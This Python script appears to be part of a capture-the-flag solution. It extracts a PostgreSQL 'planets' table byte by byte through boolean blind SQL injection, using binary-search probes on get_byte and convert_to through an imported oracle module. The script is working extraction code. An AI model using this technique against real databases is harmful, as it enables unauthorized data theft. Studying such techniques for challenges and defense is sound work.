#!/usr/bin/env python
"""Dump the planets rows byte-exactly.

read_str() compares ascii() in 32..126, which silently clamps anything odd; the regex probe
`description ~ '[^ -~]'` proved a control/non-ascii byte is in there, so the interesting data
is stashed in characters the lamp cannot show. octet_length + get_byte(convert_to(...,'UTF8'))
reads the raw encoding instead of code points, so multi-byte UTF-8 survives too.
"""
import json
import sys

import extract as E

AGG = "(SELECT string_agg(id::text||chr(9)||name||chr(9)||diameter_km::text||chr(9)||description, chr(10) ORDER BY id) FROM planets)"


def read_bytes(expr, label, maxlen=4096):
    n = E.read_len("octet_length(%s)" % expr, maxlen)
    print("[*] %s: %d bytes" % (label, n), flush=True)
    raw = E.fan(lambda i: bsearch_byte(expr, i), range(0, n))
    data = bytes(x for x in raw if isinstance(x, int))
    print("[=] %s hex = %s" % (label, data.hex()), flush=True)
    print("[=] %s repr = %r" % (label, data), flush=True)
    open("analysis/%s.bin" % label, "wb").write(data)
    return data


def bsearch_byte(expr, i):
    lo, hi = 0, 255
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if cond_byte(expr, i, mid):
            lo = mid
        else:
            hi = mid - 1
    return lo


def cond_byte(expr, i, v):
    return E.cond("get_byte(convert_to((%s),'UTF8'),%d)>=%d" % (expr, i, v))


if __name__ == "__main__":
    which = E.fan(lambda i: E.cond("EXISTS(SELECT 1 FROM planets WHERE id=%d AND description ~ '[^ -~]')" % i),
                  range(1, 13))
    print("[*] ids 1..13 carrying a non-printable byte:", [i + 1 for r, i in zip(which, range(1, 13)) if r is True])
    data = read_bytes(AGG, "planets")
    print("[*] %d probes" % E.CALL[0])
